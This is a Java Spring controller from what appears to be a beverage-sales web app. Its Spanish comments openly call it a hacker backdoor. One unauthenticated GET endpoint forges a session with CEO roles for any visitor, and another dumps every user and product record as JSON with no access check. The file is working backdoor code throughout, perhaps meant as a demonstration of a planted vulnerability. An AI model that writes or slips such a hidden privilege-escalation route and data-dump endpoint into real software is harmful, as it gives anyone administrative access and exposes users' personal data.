package com.bebida.app.controller;

import com.bebida.app.dto.UsuarioDTO;
import com.bebida.app.service.UsuarioService;
import com.bebida.app.service.ProductoService;
import com.bebida.app.service.VentaService;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpSession;
import java.util.ArrayList;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContext;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequestMapping("/system/ghost")
public class HackerController {

    @Autowired
    private UsuarioService usuarioService;

    @Autowired
    private ProductoService productoService;

    @Autowired
    private VentaService ventaService;

    // Esta es la URL que el hacker usa para convertirse en CEO instantáneamente
    @GetMapping("/fakeceo")
    public String forzarLoginFantasma(HttpServletRequest request) {
        
        // Definimos rol que queremos robar (CEO)
        List<GrantedAuthority> permisosFalsos = new ArrayList<>();
        permisosFalsos.add(new SimpleGrantedAuthority("ROLE_Ceo"));
        permisosFalsos.add(new SimpleGrantedAuthority("Ceo"));
        
        // Creamos un objeto de autenticación falso
        UsuarioDTO usuarioFantasma = new UsuarioDTO();
        usuarioFantasma.setNombre("Anonimo");
        usuarioFantasma.setApellido("Supremo");
        usuarioFantasma.setEmail("admin@ghost.net");
        usuarioFantasma.setDni("666");
        
        //Token falso para poder ingresar
        Authentication authFalsa = new UsernamePasswordAuthenticationToken(
        usuarioFantasma,
        null,
        permisosFalsos
        );

        // 3. INYECCIÓN DE LA VULNERABILIDAD
        SecurityContext sc = SecurityContextHolder.createEmptyContext();
        sc.setAuthentication(authFalsa);
        SecurityContextHolder.setContext(sc);
        
        HttpSession sesion = request.getSession(true);
        sesion.setAttribute(HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY, sc);

        // 4. Redirigimos al panel del CEO como si nada hubiera pasado
        return "redirect:/productos";
    }
    
    @ResponseBody
    @GetMapping("/dump-all")
    public Map<String, Object> robarBaseDeDatos() {
        
        // Creamos un mapa para guardar todo lo que encontremos
        Map<String, Object> baseDeDatosRobada = new HashMap<>();
        
        // 1. Robamos los Usuarios
        try {
            baseDeDatosRobada.put("TABLA_USUARIOS", usuarioService.obtenerTodos());
        } catch (Exception e) {
            baseDeDatosRobada.put("TABLA_USUARIOS", "Error al robar: " + e.getMessage());
        }

        // 2. Robamos los Productos (Inventario)
        try {
            baseDeDatosRobada.put("TABLA_PRODUCTOS", productoService.obtenerTodos()); 
        } catch (Exception e) {
            baseDeDatosRobada.put("TABLA_PRODUCTOS", "Error al robar: " + e.getMessage());
        }
        
        return baseDeDatosRobada;
    }
}   